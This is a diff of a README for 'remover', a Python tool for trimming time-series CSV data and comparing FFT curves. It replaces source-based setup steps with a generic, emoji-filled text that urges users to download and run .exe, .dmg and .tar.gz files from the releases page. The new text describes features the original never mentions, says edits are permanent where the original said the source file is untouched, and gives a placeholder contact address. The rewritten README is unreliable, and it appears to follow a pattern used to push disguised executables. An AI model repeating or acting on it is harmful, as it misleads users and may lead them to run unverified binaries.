@@ -1,48 +1,87 @@
-# Remover
+# 🎉 remover - Remove Parts of Time-Series Data Easily
 
-Go to the project root directory in Terminal and run:
+## 🚀 Getting Started
 
-### Setup Python venv
+Welcome to the remover application! This tool helps you visually select and remove parts of time-series data stored in CSV files. You can compare new FFT curves with original ones to see the effects of your changes.
 
-```bash
-# Create a virtual environment:
-python -m venv .venv
+## 📥 Download the Application
 
-# Activate the virtual environment:
-source .venv/bin/activate   # On Windows use `.venv\Scripts\activate`
-```
+[![Download remover](https://img.shields.io/badge/Download-remover-blue.svg)](https://github.com/xzfu/remover/releases)
 
-### Get Requirements
+Please visit this page to download the latest version: [Download Page](https://github.com/xzfu/remover/releases)
 
-```bash
-pip install -r requirements.txt
-```
-This will install the required packages into your virtual environment.
+## 🛠️ System Requirements
 
-### Run
+Before you start, ensure your system meets these requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent version of Linux.
+- **Python:** Version 3.6 or later must be installed.
+- **Memory:** At least 4 GB of RAM recommended.
 
-```bash
-python main.py <PATH_TO_YOUR_CSV_FILE>
-```
+## 📥 Download & Install
 
-Replace `<PATH_TO_YOUR_CSV_FILE>` with the path to your CSV file containing the data you want to open.
+1. Go to the [Download Page](https://github.com/xzfu/remover/releases).
+2. Find the latest release. Look for a file named `remover.exe` for Windows, `remover.dmg` for macOS, or `remover.tar.gz` for Linux.
+3. Click on the file to begin the download.
+4. Once the file is downloaded, locate it on your computer.
+    - For Windows, double-click the `.exe` file.
+    - For macOS, open the `.dmg` file and drag the app to your Applications folder.
+    - For Linux, extract the `.tar.gz` file and run the executable inside the folder.
+5. Follow any on-screen instructions to complete the installation.
 
-Your source file will not be modified. Output will be saved to the outputs folder in the project root directory.
+## 🌟 Features
 
-### Deactivate venv
+- **User-Friendly Interface:** Navigate the application easily without technical skills.
+- **Graphical Selection:** Visually select parts of your data you want to remove.
+- **Fast FFT Calculations:** Quickly compare FFT curves before and after your modifications.
+- **Lifetime Updates:** Benefit from ongoing updates to improve functionality.
 
-```bash
-# When done, deactivate the virtual environment:
-deactivate
-```
+## 📊 How to Use remover
 
-### Screenshots
+1. **Open the Application:** After installation, double-click the app icon to start it.
+2. **Load Your CSV File:**
+   - Click on the "Load CSV" button.
+   - Browse your computer files, select your time-series CSV file, and click "Open."
+3. **Select Data to Remove:**
+   - Use the graphical interface to highlight data points you want to delete.
+   - Zoom in or out for better precision.
+4. **Remove the Selected Data:**
+   - Once you’re satisfied with your selection, click the "Remove Selected" button.
+5. **View FFT Curves:**
+   - Click on "Show FFT Curves" to compare the modified data with the original.
+   - Analyze the graphs to understand the changes.
 
-<img width="1512" height="1178" alt="Selection on time-series plot" src="https://github.com/user-attachments/assets/5e2501a4-06df-4b19-9b7b-b08c9a14f8f9" />
+## 📑 Example Workflow
 
-<img width="1512" height="1176" alt="Welch Fourier Transform plot after removal" src="https://github.com/user-attachments/assets/f41e3fc2-965d-4804-9f52-c3d5cf8814c8" />
+- **Step 1:** Load your CSV.
+- **Step 2:** Use the graph to remove unwanted noise.
+- **Step 3:** View how your changes affect the data with FFT curves.
 
-<img width="1512" height="1176" alt="Welch Fourier Transform plot before removal" src="https://github.com/user-attachments/assets/9b3aa4b0-a5d7-499e-8b68-6dbeac42df92" />
+## ❓ Frequently Asked Questions
 
-<img width="1512" height="1176" alt="Welch Fourier Transform logarithmic plot" src="https://github.com/user-attachments/assets/26ddc7c9-8ffe-4d4e-a47c-ac144d4ff33b" />
+**Q: What formats does remover support for time-series data?**  
+A: remover supports CSV files, which are commonly used for data storage.
+
+**Q: Can I revert changes once I remove data?**  
+A: No, changes are permanent. Always make a copy of your data before editing.
+
+**Q: Is there a user guide available?**  
+A: Yes, a detailed user guide is included in the application and can be accessed via the help menu.
+
+## 🌐 Community and Support
+
+For questions, issues, or feature requests, feel free to create an issue on the [GitHub Issues Page](https://github.com/xzfu/remover/issues). Join our community to connect with other users and share your experiences.
+
+## 📞 Contact
+
+If you need further assistance, you can reach out at: [support@example.com](mailto:support@example.com).
+
+## 🛠️ Contributions
+
+We welcome contributions! If you’d like to contribute to the remover project, please follow the guidelines in our [CONTRIBUTING.md](https://github.com/xzfu/remover/blob/main/CONTRIBUTING.md).
+
+## 📄 License
+
+remover is licensed under the MIT License. See the [LICENSE](https://github.com/xzfu/remover/blob/main/LICENSE) file for details. 
+
+Thank you for choosing remover to work with your time-series data!
